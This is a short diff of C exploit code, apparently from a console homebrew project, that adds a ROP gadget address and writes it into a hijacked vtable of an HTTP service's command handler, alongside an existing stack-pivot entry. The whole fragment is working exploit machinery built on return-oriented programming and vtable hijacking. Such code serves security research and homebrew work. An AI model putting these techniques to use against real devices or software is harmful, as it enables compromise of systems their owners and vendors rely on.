@@ -30,6 +30,8 @@ u32 ROP_POPR3PC = 0x00106a28;//"pop {r3, pc}"
 u32 ROP_LDRR0R1 = 0x00101c64;//Load r0 from r1, then bx-lr.
 u32 ROP_STRR0_R1x4 = 0x00101c8c;//Store r0 to r1+4, then bx-lr.
 
+u32 ROP_MVNR0VAL0_BXLR = 0x001074bc;
+
 u32 ROP_BLXR3_ADDSP12_POPPC = 0x00119438;//"blx r3" "add sp, sp, #12" "pop {pc}"
 
 u32 ROP_STRR7_R5x48_POPR4R5R6R7R8PC = 0x00102430;//Write r7 to r5+0x48. "pop {r4, r5, r6, r7, r8, pc}"
@@ -1291,6 +1293,7 @@ Result setuphaxx_httpheap_sharedmem(targeturlctx *first_targeturlctx)
 	ptr = custom_cmdhandlervtable_sharedmemptr;
 	memcpy(ptr, &http_codebin_buf[ROP_HTTPC_CMDHANDLEROBJ_VTABLE - 0x100000], ROP_HTTPC_CMDHANDLEROBJ_VTABLE_SIZE);
 	ptr[0x8>>2] = ROP_STACKPIVOT-4;//vtable funcptr for the actual httpc_cmdhandler function.
+	ptr[0xc>>2] = ROP_MVNR0VAL0_BXLR;//This vtable funcptr is used for checking what thread to handle the command with. Adjust the address so that it always returns ~0(-1) for handling the command with the current(main) thread.
 
 	//Setup the custom vtables for context-sessions.
 	cur_targeturlctx = first_targeturlctx;
